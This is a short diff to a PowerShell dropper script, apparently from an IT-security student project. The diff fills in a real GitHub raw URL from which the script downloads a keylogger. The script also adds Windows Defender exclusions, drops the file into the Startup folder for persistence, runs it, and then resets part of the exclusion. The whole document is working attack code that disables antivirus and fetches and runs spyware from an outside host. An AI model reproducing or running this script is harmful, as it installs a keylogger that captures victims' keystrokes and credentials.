@@ -1,6 +1,6 @@
 Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-Invoke-WebRequest LINK -O keylogger.exe #Download keylogger script
+Invoke-WebRequest https://raw.githubusercontent.com/JustusKapst/it-security_projekt1/refs/heads/main/GithubKeylogger/keylogger.py -O keylogger.exe #Download keylogger script
 Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
 Start-Process keylogger.exe #Start keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
